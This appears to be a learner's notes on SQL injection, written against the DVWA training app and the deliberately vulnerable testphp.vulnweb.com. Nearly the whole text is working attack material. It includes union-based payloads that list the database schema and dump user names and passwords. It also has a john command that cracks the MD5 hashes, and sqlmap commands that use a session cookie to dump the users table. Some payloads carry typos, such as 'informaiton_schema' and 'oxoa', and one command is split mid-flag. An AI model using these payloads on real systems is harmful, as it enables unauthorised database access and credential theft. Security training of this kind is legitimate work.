sql injeciton low vulnerabilities: - 

1

1'

%

%' or '0'='0

%' or '0'='0' union select * from password #

%' or '0'='0' union select  COLUMN_NAME from information_schema.COLUMNS #

%' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #

%' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = 'users' #

%' or '0'='0' union select user, password from dvwa.users # 


after observ the md5 password now decode the password using john 

john --wordlist=rockyou.txt --format=Raw-MD5 hashes.txt



method 2 low sql injeciton : - 

1

1'  -- if you show sql syntax error that's mean that is a sql injeciton vulnerability.

SELECT first_name, last_name FROM users WHERE user_id = ''';

%' or '0' = '0

SELECT first_name, last_name FROM users WHERE user_id = '%' or '0' = '0';

%' or 0=0 union select null, version() #

SELECT first_name, last_name FROM users WHERE user_id = '%' or 0=0 union select null, version() #';

'% or 0=0 union select null, version() #

%' UNION SELECT null, column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='users'#

%' UNION SELECT null, concat(user,0x0a,password) FROM users#


using sqlmap : - 

http://172.17.0.2/vulnerabilities/sqli/?id=1&Submit=Submit#

sqlmap -u 'http://172.17.0.2/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie "PHPSESSID=qehkul5i897soktsniinft21s3; security=low" --dbs

sqlmap -u 'http://172.17.0.2/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie "PHPSESSID=qehkul5i897soktsniinft21s3; security=low" -D dvwa --tables

sqlmap -u 'http://172.17.0.2/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie "PHPSESSID=qehkul5i897soktsniinft21s3; security=low" -D dvwa -T users --columns

sqlmap -u 'http://172.17.0.2/vulnerabilities/sqli/?id=1&Submit=Submit#' --c

ookie "PHPSESSID=qehkul5i897soktsniinft21s3; security=low" -D dvwa -T users --dump


example testphp.vulnweb.com : - 

if you show the vulneable parameter like ?cat=1

http://testphp.vulnweb.com/list-products.php?cat=1'    --- show sql syntax error
						       --- add ''' 3 coat's
						       ---"cat=1"' query unbalancing error
						       ---"select * from t"' if you add 3 coats then query is unbalancing
						       
http://testphp.vulnweb.com/list-products.php?cat=1 order by 1 --+

http://testphp.vulnweb.com/list-products.php?cat=1 order by 2 --+

http://testphp.vulnweb.com/list-products.php?cat=1 order by 3 --+  -- now check no of columns ex: 50

union query : - 
http://testphp.vulnweb.com/list-products.php?cat=1 union select 1,2,3,4,5,6,7,8,9,10,11--+

http://testphp.vulnweb.com/list-products.php?cat=1 union select 1,2,3,4,5,6,database(),8,version(),10,11--+

http://testphp.vulnweb.com/list-products.php?cat=1 union select 1,table_name,3,4,5,6,7,8,9,10,11 from informaiton_schema.tables--+

http://testphp.vulnweb.com/list-products.php?cat=1 union select 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema="acuart"--+

http://testphp.vulnweb.com/list-products.php?cat=1 union select 1,column_name,3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name='users'--+

http://testphp.vulnweb.com/list-products.php?cat=1 union select 1,group_concat(uname,oxoa,pass,"",cc)3,4,5,6,7,8,9,10,11 from users--+
